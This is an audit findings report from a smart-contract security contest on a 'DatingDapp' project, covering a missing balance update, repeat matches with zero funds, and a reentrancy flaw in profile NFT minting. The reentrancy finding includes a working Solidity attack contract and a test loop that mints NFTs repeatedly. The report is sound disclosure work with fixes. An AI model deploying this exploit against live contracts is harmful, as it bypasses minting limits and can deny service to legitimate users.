# DatingDapp - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. userBalances Not Updated in LikeRegistry Contract](#H-01)
- ## Medium Risk Findings
    - ### [M-01. Multiple Matches with Zero Funds in LikeRegistry Contract](#M-01)
    - ### [M-02. Reentrancy Vulnerability in SoulboundProfileNFT Contract Allows Minting Multiple NFTs](#M-02)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #33

### Dates: Feb 6th, 2025 - Feb 13th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-02-datingdapp)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 1
- Medium: 2
- Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. userBalances Not Updated in LikeRegistry Contract            



## Summary

The `LikeRegistry` contract's `matchRewards` function relies on the `userBalances` mapping to calculate rewards for matched users. However, the `userBalances` mapping is never updated, resulting in zero balances and no rewards being distributed.

## Vulnerability Details

In the `matchRewards` function, the `userBalances` mapping is used to retrieve the balances of the matched users. These balances are then used to calculate the total rewards and fees. However, the `userBalances` mapping is never updated in the contract, meaning that the balances will always be zero.

## Impact

**No Rewards Distributed**: Since `userBalances` is never updated, the balances will always be zero, resulting in no rewards being distributed to the matched users. Also the platform will not collect the intended fees from the rewards, impacting the revenue model.

## Tools Used

* Manual code review

## Recommendations

Ensure that the `userBalances` mapping is updated appropriately when users interact with the contract. For example, update the balances when users send ETH to like another user.

```diff
function likeUser(address liked) external payable nonReentrant {
    require(msg.value >= 1 ether, "Must send at least 1 ETH");
    require(!likes[msg.sender][liked], "Already liked");
    require(msg.sender != liked, "Cannot like yourself");
    require(profileNFT.profileToToken(msg.sender) != 0, "Must have a profile NFT");
    require(profileNFT.profileToToken(liked) != 0, "Liked user must have a profile NFT");

    likes[msg.sender][liked] = true;
+    userBalances[msg.sender] += msg.value; // Update user balance
    emit Liked(msg.sender, liked);

    // Check if mutual like
    if (likes[liked][msg.sender]) {
        matches[msg.sender].push(liked);
        matches[liked].push(msg.sender);
        emit Matched(msg.sender, liked);
        matchRewards(liked, msg.sender);
    }
}
```

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. Multiple Matches with Zero Funds in LikeRegistry Contract            



## Summary

Since likes are not being reset after a match, the `LikeRegistry` contract allows users to have multiple matches. However, only the first match will receive funds because `userBalances` are reset to zero after each match.

## Vulnerability Details

1. **Likes Not Being Deleted**: In the `likeUser` function, when a mutual like is detected, the `matchRewards` function is called to distribute rewards. However, the likes are not being deleted after a match is made, allowing users to have multiple matches with the same user.
2. **Zero Funds for Subsequent Matches**: The `userBalances` are reset to zero after the first match, resulting in zero funds for subsequent matches. This means that only the first match will have funds, while subsequent matches will have zero funds.

## Impact

1. **Zero Funds for Subsequent Matches**: Only the first match will have funds, while subsequent matches will have zero funds due to the `userBalances` being reset to zero.
2. **User Dissatisfaction**: Users may be dissatisfied if they expect rewards from multiple matches but only receive funds for the first match.

## Tools Used

* Manual code review

## Recommendations

1. **Delete Likes After Matching**: Ensure that likes are deleted after a match is made to prevent multiple matches with the same user.
2. **Update `userBalances` Appropriately**: Ensure that `userBalances` are updated correctly to reflect the funds available for each match.

## <a id='M-02'></a>M-02. Reentrancy Vulnerability in SoulboundProfileNFT Contract Allows Minting Multiple NFTs            



## Summary

The `SoulboundProfileNFT` contract contains a reentrancy vulnerability that allows users to mint multiple NFTs. This issue arises because the mappings are updated after the minting process, and users can burn their own profile to mint a new one repeatedly. This allows users to bypass the restriction of having only one profile NFT.

## Vulnerability Details

In the `mintProfile` function, the mappings `profileToToken` and `_profiles` are updated after the minting process. This allows a reentrancy attack where a user can mint multiple NFTs by burning their profile and minting a new one repeatedly.

## Impact

1. **Denial of Service (DoS)**: If a malicious user mints all possible NFTs, new users will not be able to register, leading to a denial of service.
2. **Loss of Trust**: The ability to mint multiple NFTs undermines the integrity of the platform and can lead to a loss of trust among users.
3. **Potential Financial Loss**: The platform may suffer financial losses due to the exploitation of this vulnerability.

## Tools Used

* Manual code review

## POC

1 - First create the contract that will receive the NFT's.

```Solidity
contract Receiver {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        if (SoulboundProfileNFT(victim).balanceOf(address(this)) < type(uint256).max) {
            try SoulboundProfileNFT(victim).mintProfile("Alice", 25, "ipfs://profileImage") {
                return this.onERC721Received.selector;
            } catch {
                return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
            }
        }
        return this.onERC721Received.selector;
    }

    function attack() external {
        try SoulboundProfileNFT(victim).burnProfile() {} catch {}
        SoulboundProfileNFT(victim).mintProfile("Alice", 25, "ipfs://profileImage");
    }
}

```

2 - Implement the following test function.

```Solidity
function testMintingMultipleTimes() external {
        Receiver receiver = new Receiver(address(soulboundNFT));

        uint256 amount = soulboundNFT.balanceOf(address(receiver));
        while (amount < type(uint256).max && gasleft() > 10000) {
            try receiver.attack() {} catch {}
            amount = soulboundNFT.balanceOf(address(receiver));
        }
        assertEq(amount, 1, "Should mint only once");
    }
```

3 - This test will fail because the assertion is not met. During testing, i successfully minted 8,691 NFTs, but this process can be repeated until all possible NFTs are minted.

## Recommendations

1. **Use Reentrancy Guard**: Implement a reentrancy guard to prevent reentrancy attacks. The OpenZeppelin `ReentrancyGuard` can be used for this purpose.
2. **Use CEI pattern:** Update the mappings `profileToToken` and `_profiles` before the minting process to prevent reentrancy attacks.
   ```Solidity
   function mintProfile(string memory name, uint8 age, string memory profileImage) external {
     // Checks      
           require(profileToToken[msg.sender] == 0, "Profile already exists");

     // Effects
           uint256 tokenId = ++_nextTokenId;
           _profiles[tokenId] = Profile(name, age, profileImage);
           profileToToken[msg.sender] = tokenId;
     // Interactions
           _safeMint(msg.sender, tokenId);

           // Store metadata on-chain

           emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
       }
   ```





